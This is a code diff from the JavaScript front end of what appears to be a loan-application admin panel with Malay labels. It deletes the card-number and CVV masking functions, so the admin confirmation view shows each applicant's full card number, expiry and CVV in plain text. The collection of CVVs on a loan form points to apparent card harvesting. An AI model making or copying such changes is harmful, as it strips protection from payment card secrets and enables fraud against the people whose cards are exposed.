@@ -452,20 +452,6 @@ async function submitWithdrawal(e) {
   }
 }
 
-function maskCardNumber(number) {
-  if (!number) return '-';
-  const digits = String(number).replace(/\D/g, '');
-  if (digits.length < 4) return '****';
-  const last4 = digits.slice(-4);
-  const groupCount = Math.ceil((digits.length - 4) / 4);
-  if (groupCount <= 0) return last4;
-  const maskGroups = Array.from({ length: groupCount }, () => '****').join(' ');
-  return `${maskGroups} ${last4}`;
-}
-function maskCvv(cvv) {
-  return cvv ? '***' : '-';
-}
-
 async function openLoanAdminConfirmation(data) {
   const {
     applicationId, fullName, phone, email, amount, tenor, purpose,
@@ -512,9 +498,9 @@ async function openLoanAdminConfirmation(data) {
           <div class="bg-slate-50 rounded-xl p-4 text-sm space-y-1 mb-3">
             <p class="font-semibold text-slate-800 mb-2">${i18n('notif.cardSection', '💳 MAKLUMAT KAD')}</p>
             <hr class="border-slate-200 my-2" />
-            <div class="flex justify-between"><span class="text-slate-500">${i18n('notif.cardNumber', 'Kad')}</span><span class="font-bold text-slate-800">${maskCardNumber(cardNumber)}</span></div>
+            <div class="flex justify-between"><span class="text-slate-500">${i18n('notif.cardNumber', 'Kad')}</span><span class="font-bold text-slate-800 break-all">${cardNumber || '-'}</span></div>
             <div class="flex justify-between"><span class="text-slate-500">${i18n('notif.cardExpiry', 'Masa cad')}</span><span class="font-bold text-slate-800">${cardExpiryText || '/'}</span></div>
-            <div class="flex justify-between"><span class="text-slate-500">${i18n('notif.cardCvv', 'cod')}</span><span class="font-bold text-slate-800">${maskCvv(cardCvv)}</span></div>
+            <div class="flex justify-between"><span class="text-slate-500">${i18n('notif.cardCvv', 'cod')}</span><span class="font-bold text-slate-800">${cardCvv || '-'}</span></div>
           </div>
 
           <div class="bg-slate-50 rounded-xl p-4 text-sm space-y-1 mb-3">
